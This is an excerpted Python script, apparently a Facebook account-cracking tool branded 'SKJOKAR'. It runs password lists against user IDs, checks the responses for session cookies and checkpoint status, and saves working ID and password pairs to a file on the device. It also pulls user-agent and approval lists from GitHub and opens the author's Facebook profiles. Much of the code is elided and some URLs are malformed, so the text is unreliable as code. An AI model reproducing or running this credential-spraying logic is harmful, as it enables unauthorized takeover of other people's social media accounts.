...
import os,base64
os.system("xdg-open https://www.facebook.com/Qurbanjatoi110?mibextid=ZbWKwL/?ref=share")
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/SHaYanxALyan/skjokar/main/skj.txt ').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://https://raw.githubusercontent.com/SHaYanxALyan/skjokar/main/skj .txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
|  $$$$$$/| $$ \  $$
 \______/ |__/  \__/    XD
\033[1;32m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mSHaYaN KHaN \033[1;32m
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/SKJOKAR.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/SKJOKAR.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/SKJOKAR.txt\033[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[SKJOKAR-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/SKJOKAR-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [SKJOKAR-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get(' https://raw.githubusercontent.com/SHaYanxALyan/sk-jokar/main/sk').text
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get(' https://raw.githubusercontent.com/SHaYanxALyan/sk-jokar/main/sk .txt').text
  ...
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/SHaYanxALyan/skjokar/main/skj.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/ShaYan007king?mibextid=ZbWKwL   ')
      time.sleep(2)
      sys.exit()
  except: 
    sys.exit()
